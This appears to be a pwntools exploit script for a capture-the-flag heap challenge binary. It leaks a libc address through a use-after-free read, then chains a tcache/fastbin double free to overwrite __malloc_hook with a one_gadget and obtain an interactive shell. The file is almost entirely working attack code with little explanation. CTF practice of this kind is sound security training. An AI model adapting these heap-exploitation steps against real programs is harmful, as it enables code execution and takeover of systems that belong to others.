
from pwn import *
from time import sleep
# context.log_level = "debug"
context.log_level = "critical"
context.binary = "./chall"
elf = context.binary
libc = elf.libc
libc.sym['main_arena'] = 0x1e4c40
libc.sym['one_gadget'] = 0x106ef8

def add(size, cont):
    io.sendlineafter("choice:", "1")
    io.sendlineafter("name\n", str(size))
    io.sendafter("name:\n", cont)
    sleep(0.01)
    io.sendafter("call:\n", '0000')
    sleep(0.01)

def show(idx):
    io.sendlineafter("choice:", "2")
    io.sendlineafter("index:\n", str(idx))

def delete(idx):
    io.sendlineafter("choice:", "4")
    io.sendlineafter("index:\n", str(idx))

def DEBUG():
    base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
    print("\n================= DEBUG: ================")
    print("pid -> {}".format(io.pid))
    print("malloc @ {:#x}".format(base + 0xC0A))
    print("free @ {:#x}".format(base + 0xDD6))
    print("================= DEBUG: ================\n")
    pause()

io = process("./chall")

add(0x450, '0')
add(0x10, '1')
delete(0)
show(0)
libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - libc.sym['main_arena'] - 96
print("libc @ {:#x}".format(libc.address))

for i in xrange(7 + 1 + 2):
    add(0x68, str(i))
for i in xrange(7 + 1):
    delete(i + 1)

delete(9) # a
delete(10)# b -> a
delete(9) # a -> b -> a

for i in xrange(7):
    add(0x68, str(i))

add(0x68, flat(libc.sym['__malloc_hook'] - 0x13)) # b -> a -> target
add(0x68, 'x') # a -> target
add(0x68, 'x') # target
add(0x68, flat('\0' * 0xb, libc.sym['one_gadget'], libc.sym['__libc_realloc'] + 6))
io.sendlineafter("choice:", "1")

io.interactive()
